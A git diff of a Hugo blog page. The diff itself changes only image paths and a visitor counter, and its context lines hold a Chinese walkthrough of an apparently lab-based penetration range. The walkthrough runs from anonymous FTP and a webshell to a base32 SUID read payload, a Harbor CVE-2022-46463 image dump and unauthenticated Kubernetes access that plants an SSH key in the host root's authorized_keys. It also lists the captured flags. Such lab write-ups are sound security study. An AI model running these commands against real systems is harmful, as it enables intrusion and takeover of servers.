 <p>前面fscan扫到172.28.23.26有个ftp服务</p>
 <pre tabindex="0"><code>[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
 </code></pre><p>匿名用户可以直接登录</p>
-<p><img alt="image-20250522112350742" loading="lazy" src="./assets/image-20250522112350742.png"></p>
+<p><img alt="image-20250522112350742" loading="lazy" src="../assets/image-20250522112350742.png"></p>
 <p>可以拿到oa的源码，扒下来审计</p>
 <p>可以看到这个</p>
 <p>uploadbase64.php</p>
@@ -473,11 +473,11 @@ flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
 <pre tabindex="0"><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
 </code></pre><p>我们可以利用环境变量 LD_PRELOAD 劫持系统函数，从而绕过</p>
 <p>蚁剑中有插件</p>
-<p><img alt="image-20250522120131429" loading="lazy" src="./assets/image-20250522120131429.png"></p>
+<p><img alt="image-20250522120131429" loading="lazy" src="../assets/image-20250522120131429.png"></p>
 <p>修改一下.antproxy.php中的url路径</p>
-<p><img alt="image-20250522120923285" loading="lazy" src="./assets/image-20250522120923285.png"></p>
+<p><img alt="image-20250522120923285" loading="lazy" src="../assets/image-20250522120923285.png"></p>
 <p>不知道这里一句话木马为什么不能用POST传参，用GET就可以正常RCEl</p>
-<p><img alt="image-20250522155422629" loading="lazy" src="./assets/image-20250522155422629.png"></p>
+<p><img alt="image-20250522155422629" loading="lazy" src="../assets/image-20250522155422629.png"></p>
 <p>发现没办法直接读flag，需要提权</p>
 <p>尝试suid提权</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">/bin/fusermount
@@ -500,8 +500,8 @@ flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
 </span></span><span class="line"><span class="ln">18</span><span class="cl">/usr/lib/eject/dmcrypt-get-device
 </span></span><span class="line"><span class="ln">19</span><span class="cl">/usr/lib/s-nail/s-nail-privsep
 </span></span></code></pre></div><p>用base32实现提权</p>
-<p><img alt="image-20250522155605726" loading="lazy" src="./assets/image-20250522155605726.png"></p>
-<p><img alt="image-20250522160019399" loading="lazy" src="./assets/image-20250522160019399.png"></p>
+<p><img alt="image-20250522155605726" loading="lazy" src="../assets/image-20250522155605726.png"></p>
+<p><img alt="image-20250522160019399" loading="lazy" src="../assets/image-20250522160019399.png"></p>
 <p>payload</p>
 <pre tabindex="0"><code>?1=system(&#34;base32 /flag02.txt|base32 --decode&#34;);
 </code></pre><p><strong>FLAG3</strong></p>
@@ -509,7 +509,7 @@ flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
 </code></pre><h2 id="第二层">第二层<a hidden class="anchor" aria-hidden="true" href="#第二层">#</a></h2>
 <h3 id="分支一-1722214024">分支一 [172.22.14.0/24]<a hidden class="anchor" aria-hidden="true" href="#分支一-1722214024">#</a></h3>
 <p>传个fscan进行信息收集</p>
-<p><img alt="image-20250522162347925" loading="lazy" src="./assets/image-20250522162347925.png"></p>
+<p><img alt="image-20250522162347925" loading="lazy" src="../assets/image-20250522162347925.png"></p>
 <p>ip addr</p>
 <pre tabindex="0"><code>www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ip addr show
 ip addr show
@@ -597,20 +597,20 @@ ip addr show
 [2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.46    存活 (ICMP)
 </code></pre><h4 id="harbor">Harbor<a hidden class="anchor" aria-hidden="true" href="#harbor">#</a></h4>
 <p>可以看到172.22.14.46上存在Swagger未授权访问，但是没什么用</p>
-<p><img alt="image-20250522173242235" loading="lazy" src="./assets/image-20250522173242235.png"></p>
+<p><img alt="image-20250522173242235" loading="lazy" src="../assets/image-20250522173242235.png"></p>
 <p>Harbor的版本为 v2.10</p>
-<p><img alt="image-20250522173335511" loading="lazy" src="./assets/image-20250522173335511.png"></p>
+<p><img alt="image-20250522173335511" loading="lazy" src="../assets/image-20250522173335511.png"></p>
 <p>尝试打Harbor未授权</p>
 <p><a href="https://github.com/404tk/CVE-2022-46463">404tk/CVE-2022-46463: harbor unauthorized detection</a></p>
-<p><img alt="image-20250522173828907" loading="lazy" src="./assets/image-20250522173828907.png"></p>
+<p><img alt="image-20250522173828907" loading="lazy" src="../assets/image-20250522173828907.png"></p>
 <p>看到有个叫做harbor/secret的镜像，我们把它dump下来</p>
 <pre tabindex="0"><code>python harbor.py http://172.22.14.46/ --dump harbor/secret --v2
-</code></pre><p><img alt="image-20250522180342278" loading="lazy" src="./assets/image-20250522180342278.png"></p>
+</code></pre><p><img alt="image-20250522180342278" loading="lazy" src="../assets/image-20250522180342278.png"></p>
 <p>dump下来之后可以找到flag</p>
 <pre tabindex="0"><code>flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
 </code></pre><h4 id="k8s">K8S<a hidden class="anchor" aria-hidden="true" href="#k8s">#</a></h4>
 <p>通过fscan的端口扫描，我们可以发现6443端口存在K8s API server未授权</p>
-<p><img alt="image-20250522190528918" loading="lazy" src="./assets/image-20250522190528918.png"></p>
+<p><img alt="image-20250522190528918" loading="lazy" src="../assets/image-20250522190528918.png"></p>
 <p><a href="https://zone.huoxian.cn/d/1153-k8s">浅析K8S各种未授权攻击方法 - 火线 Zone-安全攻防社区</a></p>
 <p><a href="https://xz.aliyun.com/news/14423">春秋云境-GreatWall-先知社区</a></p>
 <p>用 nginx:1.8 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录</p>
@@ -620,12 +620,12 @@ ip addr show
 <pre tabindex="0"><code>.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default
 </code></pre><p>进入容器</p>
 <pre tabindex="0"><code>.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment /bin/bash
-</code></pre><p><img alt="image-20250522191728023" loading="lazy" src="./assets/image-20250522191728023.png"></p>
+</code></pre><p><img alt="image-20250522191728023" loading="lazy" src="../assets/image-20250522191728023.png"></p>
 <p>本地kali生成一个公钥，并写入</p>
 <pre tabindex="0"><code>echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDZYuEupRm/hWalqMOfLjHs5skSsFjUfK7dVb3K1uD75ITbdaeIVj6gZfssJ1A1euE2omXRoYiInDrnf+033BfTQvyeSENKI4vqjvvSad4Fy8c8tnIwBqtX6CoF7nr1XIzPH1vFQ/3nW//JlfrM7sxjpMXnd1EEJjJJrusD9Z1uV2jx9QdRJDxNCdErVss4kNhfkiG5W7gOQlkAYbrHFyWo4EtPuL0HVRt6Cb3tOMxKkQY98NO8RNLm5QXBjdIDLKVcfnOqvSxga7BuRym+ATJny/8zx9sOziQSQkQ/qfBeUJMPeaq9VkVAs2EwPDUrcmoUuWB9duxW1ekx+9pyQpuHhUuSbARFUFaGNfIGF0Lb2i9lC2RRRGUspyxDeJwx2n1KS2L/9S4aT4d1I4pRJy3ZF41c6XDvGVixQeJp6a2KUL+Yz0OrEBIW/sgZ+f4X435iEsUhGLOxavnnZh2gz8B231cmrecj0JNYVwLSkRC3+zgmOrwayDp/h8W36CV0odE//BumeStXB5ACq8++0B7ukd7HZs/2tEjac5oJrmdPsUkE3AmmXlDyGITR0LeUAD1daYWoisrkCuwL3tPP5YJqa0lBZmkN9RLzEzzDyXHbGLFtk2zDvRh8xqdm8mGQ7ZWu4aSwUFG6G1icmx3gSys7X3s1rZGXuVM9i0xBiH9wIQ== root@Xrntkk-Laptop&#34; &gt; /mnt/root/.ssh/authorized_keys
 </code></pre><p>kali连ssh</p>
 <pre tabindex="0"><code> proxychains4 ssh -i /root/.ssh/id_rsa root@172.22.14.37
-</code></pre><p><img alt="image-20250522193504687" loading="lazy" src="./assets/image-20250522193504687.png"></p>
+</code></pre><p><img alt="image-20250522193504687" loading="lazy" src="../assets/image-20250522193504687.png"></p>
 <p>当前目录可以看到一个.mysql_history</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">root@ubuntu-k8s:~# cat .mysql_history
 </span></span><span class="line"><span class="ln"> 2</span><span class="cl">_HiStOrY_V2_
@@ -656,7 +656,7 @@ ip addr show
 </span></span><span class="line"><span class="ln">27</span><span class="cl">show<span class="se">\0</span>40databases<span class="p">;</span>
 </span></span><span class="line"><span class="ln">28</span><span class="cl">quit
 </span></span></code></pre></div><p>看到flag04，base64解码后拿到flag</p>
-<p><img alt="image-20250522193658783" loading="lazy" src="./assets/image-20250522193658783.png"></p>
+<p><img alt="image-20250522193658783" loading="lazy" src="../assets/image-20250522193658783.png"></p>
 <pre tabindex="0"><code>flag{da69c459-7fe5-4535-b8d1-15fff496a29f}
 </code></pre><h3 id="分支二-1722210024">分支二 [172.22.10.0/24]<a hidden class="anchor" aria-hidden="true" href="#分支二-1722210024">#</a></h3>
 <p>信息收集一手</p>
@@ -716,12 +716,12 @@ ip addr show
 </code></pre><p>开放了80，22和3306端口</p>
 <h4 id="dootask">DooTask<a hidden class="anchor" aria-hidden="true" href="#dootask">#</a></h4>
 <p>在Harbor的project/projectadmin镜像中有可以找到服务的jar包</p>
-<p><img alt="image-20250522183204595" loading="lazy" src="./assets/image-20250522183204595.png"></p>
+<p><img alt="image-20250522183204595" loading="lazy" src="../assets/image-20250522183204595.png"></p>
 <p>反编译后在application.properties中可以找到关于mysql的配置文件</p>
-<p><img alt="image-20250522183619872" loading="lazy" src="./assets/image-20250522183619872.png"></p>
+<p><img alt="image-20250522183619872" loading="lazy" src="../assets/image-20250522183619872.png"></p>
 <p>可以看到数据库地址就是这台机子</p>
 <p>MDUT一把梭拿到flag</p>
-<p><img alt="image-20250522184006046" loading="lazy" src="./assets/image-20250522184006046.png"></p>
+<p><img alt="image-20250522184006046" loading="lazy" src="../assets/image-20250522184006046.png"></p>
 <pre tabindex="0"><code>flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}
 </code></pre>
 
@@ -808,7 +808,12 @@ ip addr show
         <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
     </span>
     <div class="busuanzi-footer">
-        <span id="busuanzi_container_site_pv">Site Visits：<span id="busuanzi_value_site_pv"></span></span>
+    <span id="busuanzi_container_site_pv">
+        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
+    </span>
+    <span id="busuanzi_container_site_uv">
+        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
+    </span>
     </div></footer>
 <a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
